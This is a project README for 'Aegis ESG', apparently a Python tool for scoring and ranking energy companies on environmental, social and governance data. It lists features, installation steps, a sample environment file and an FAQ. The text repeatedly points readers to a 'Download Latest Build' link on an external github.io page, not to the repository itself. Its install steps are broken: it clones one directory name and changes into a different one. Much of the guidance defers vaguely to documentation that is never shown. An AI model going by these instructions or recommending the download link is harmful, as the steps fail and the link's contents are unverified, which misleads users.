# Aegis ESG - ESG Evaluation System 2026

> **Aegis ESG is a Python-based framework for evaluating and ranking energy companies using auditable sustainability data, documented evidence, and consistent ESG scoring methods.**

[![Platform](https://img.shields.io/badge/Platform-Python-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-current-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/bakermichaelirk7727/aegis-esg-rankings?style=flat-square)](https://github.com/bakermichaelirk7727/aegis-esg-rankings)

---

<p align="center">
  <a href="https://bakermichaelirk7727.github.io/aegis-esg-rankings/">
    <img src="https://img.shields.io/badge/Download-Aegis%20ESG%20Latest-brightgreen?style=for-the-badge" alt="Download Aegis ESG">
  </a>
</p>

> **[Download Aegis ESG](https://bakermichaelirk7727.github.io/aegis-esg-rankings/)**

---

[Download Latest Build](https://bakermichaelirk7727.github.io/aegis-esg-rankings/)

---

## Overview

Aegis ESG organizes the assessment of environmental, social, and governance performance for energy companies. Its workflow brings together qualitative and quantitative indicators, weighted scoring, normalized measurements, disclosure rates, and independent E/S/G results to enable consistent comparisons within a defined group of companies.

The project is built for analysts and research teams that require rankings backed by traceable source material. Alongside scores and rankings, it can preserve source documents, extracted page content, evidence links, review states, confidence details, and SHA-256 provenance information.

---

## Capabilities

- Evaluate quantitative and qualitative ESG indicators through a unified process.
- Build weighted total scores using positive, negative, and bidirectional indicators.
- Normalize measurements and apply winsorization to limit the influence of extreme values.
- Maintain missing-data indicators, review states, confidence levels, and evaluation context.
- Link evidence to URLs, files, document pages, and extracted source text.
- Produce environmental, social, and governance subscores together with disclosure rates.
- Export company rankings as CSV, HTML, or JSON.
- Locate official reports and check the validity of PDF sources.
- Extract report-page text and derive financial facts.
- Combine exchange snapshots and review the chosen company pool.
- Expose structured evaluation data through a FastAPI query interface.
- Provide both a local audit database and a MySQL schema.
- Store SHA-256 hashes for documents and input provenance.

---

## Installation

First clone the repository and move into its directory:

```bash
git clone https://github.com/bakermichaelirk7727/aegis-esg-rankings.git
cd AegisESP
```

Create an isolated Python environment:

```bash
python -m venv .venv
```

Enable the environment for your operating system:

```bash
# Linux or macOS
source .venv/bin/activate

# Windows PowerShell
.venv\Scripts\Activate.ps1
```

Install the dependencies listed by the project, when the dependency file is available:

```bash
python -m pip install -r requirements.txt
```

Before running an evaluation, set up the required database and data sources. Start the application with the Python entry point or FastAPI launch configuration documented in the repository.

---

## Operating the System

A standard evaluation may follow this sequence:

1. Select the companies and ESG indicators for the assessment.
2. Find the relevant official reports and verify their PDF sources.
3. Extract report content, financial facts, and page-level supporting references.
4. Save evidence URLs, files, page numbers, confidence values, and review states.
5. Apply indicator direction, normalization, winsorization, and weighting settings.
6. Produce total scores, E/S/G subscores, and disclosure-rate values.
7. Inspect the company pool and audit the selected source inputs.
8. Write the rankings to CSV, HTML, or JSON.
9. Use the FastAPI routes to query evaluation results when an API-driven process is required.

Example generated files:

```text
rankings.csv
rankings.html
rankings.json
```

For API use, launch the FastAPI application through the repository's configured entry point and make requests against the available query routes.

---

## Settings and Environment

The required configuration varies according to the selected database and data-processing workflow. Keep connection credentials and source-specific settings out of version-controlled files whenever practical.

A representative environment file could contain:

```env
DATABASE_URL=mysql://USER:PASSWORD@HOST:3306/DATABASE
DATA_DIR=./data
OUTPUT_DIR=./output
```

Consult the repository configuration and startup documentation for the authoritative variable names, schema initialization steps, indicator definitions, and FastAPI options. Local audit deployments and MySQL deployments should use the schema designed for the selected setup.

---

## Requirements

- A Python runtime supported by the project's dependency set.
- Access to the Python packages and extraction utilities required by the repository.
- MySQL for workflows that use the MySQL schema or a database-backed deployment.
- Local disk space for reports, extracted text, evidence files, audit information, and ranking outputs.
- PDF files or official report sources for document-based assessments.
- Network connectivity for report discovery and remote evidence retrieval.
- Adequate storage for source documents, extracted material, and provenance data.

---

## Frequently Asked Questions

### What audience is Aegis ESG designed for?

Aegis ESG is intended for analysts, researchers, and teams comparing sustainability performance among energy companies.

### Which results can the system calculate?

It supports weighted overall scores, environmental/social/governance subscores, normalized indicator values, and disclosure-rate calculations.

### Are the supporting sources available for later review?

Yes. Records may contain evidence URLs, files, page references, extracted text, confidence details, and review status. Document and input hashes can additionally be used for provenance verification.

### How can rankings be exported?

Ranking results are available in CSV, HTML, and JSON formats.

### Is MySQL supported?

Yes. The project provides a MySQL schema alongside an option for local audit storage. Select the storage configuration that matches the deployment.

### What happens when information is missing?

Missing-data status is recorded within the evaluation workflow. Indicator settings and project rules should be reviewed before a result is assigned or interpreted.

### What should be checked after an extraction error?

Inspect the source PDF, validation outcome, referenced pages, extracted text, and provenance records. Also verify the configured input directory and data-source settings.

### Where do updates come from?

Use the repository's latest release or build link to obtain updated files, and review the project changes before applying them to an existing evaluation dataset.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
